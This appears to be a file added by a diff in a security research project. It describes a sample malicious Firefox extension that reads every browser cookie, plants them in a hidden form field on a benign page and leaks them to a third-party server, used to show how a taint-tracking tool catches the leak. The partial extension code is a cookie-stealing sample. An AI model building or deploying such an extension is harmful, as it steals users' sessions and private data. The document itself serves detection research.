@@ -1,0 +1,57 @@
+The web browser has access to many pieces of sensitive information like user
+preferences, browser cookies, user passwords, etc., all of which must be
+protected to maintain user privacy and prevent identity theft over the network.
+While JavaScript on a web-page has limited capabilities and is bounded by the
+same-origin policy, JavaScript within extensions executes with "chrome"
+privileges. It can access the file system, the network or any sensitive data
+store, unlike scripts on web-pages which only have access to the cookies of the
+current domain.
+
+There are many websites that utilize third party services, mostly for search
+queries. A combination of a malicious extension and a compromised third party
+server can steal sensitive information, even without the user ever visiting a
+malicious web-page. 
+
+We present a malicious extension that leaks sensitive information to a third
+party through form fields. The extension reads all browser cookies and stores
+them in memory. When ever the user visits a specific, but benign web-page from
+domain X.com, it modifies its DOM (even before it is loaded in the user's
+browser) to create a hidden form field and injects the saved sensitive
+information into it. The web-page presents itself as an HTML form and when the
+user submits it, the form entries are sent over to a malicious server at Y.com. 
+
+EXTENSION CODE
+
+	var appcontent = window.document.getElementById("appcontent");
+	appcontent.addEventListener("DOMContentLoaded", main, false);
+	
+	var cookieMgr = Components.classes["@mozilla.org/cookiemanager;1"].getService(Components.interfaces.nsICookieManager);
+	var e = cookieMgr.enumerator;
+
+	while (e.hasMoreElements()) {
+		// read and concatenate the cookies as cookieName
+	}
+
+	function main() {
+	
+		var txtArea = window.content.document.createElement('textarea');
+		txtArea.id = "txtArea";
+		txtArea.name = "txtArea";
+		txtArea.value = cookieName;	// stores the concatenated cookies
+		txtArea.style.display = "none";
+
+		// embed the cookie details in the hidden form field			
+
+		var formTemp = window.content.document.getElementById('form1');
+		formTemp.appendChild(txtArea);
+	}
+
+
+The call in line 'x' gets a cookie manager object. During the initialization of
+this object, it reads from cookie.txt file in the profiles folder of the user.
+When the content is about to be loaded, the extension creates an invisible text
+filed and injects the saved cookie information. Since our tool taints all disk
+reads, the cookieMgr object is tainted and subsequently the string 'cookieName'
+also gets tainted. When the extension injects the sensitive data into the
+modified form, the corresponding form field also acquires a taint and the tool
+raises an alert if a tainted form is submitted.
